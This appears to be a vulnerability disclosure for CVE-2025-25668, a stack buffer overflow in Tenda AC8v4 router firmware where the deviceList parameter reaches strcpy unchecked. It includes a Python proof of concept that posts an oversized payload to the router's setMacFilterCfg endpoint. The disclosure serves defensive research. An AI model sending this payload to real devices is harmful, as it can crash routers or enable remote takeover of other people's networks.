# CVE-2025-25668

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/103518

## Affected version

AC8v4 V16.03.34.06

## Vulnerability details

In function `sub_47D878` line 8, `src` reads from the caller function `formSetMacFilterCfg` in a user-provided parameter `deviceList`, and the variable is passed to the function `strcpy` in line 28、29 without any length check, which may lead to overflow of the stack-based buffer. As a result, by requesting the page, an attacker can easily execute a **denial of service** attack or **remote code execution**.



![img](https://s2.loli.net/2025/02/15/oe1Pi784OTtZ9Rd.png)

## PoC

```python
import requests

 ip = '192.168.2.1'
 headers = {
     'Host': ip,
     'Accept': '*/*',
     'X-Requested-With': 'XMLHttpRequest',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
     'Connection': 'close',
 }

 deviceList = '1'*1000 + "\r10:11:11:11:11:22"
 data = 'macFilterType=black&deviceList='+ deviceList


 response = requests.post(
     f'http://{ip}/goform/setMacFilterCfg',
     headers=headers,
     data=data,
     verify=False,
 )
```

![img](https://s2.loli.net/2025/02/15/hNlxySfvFtCAJ9m.png)
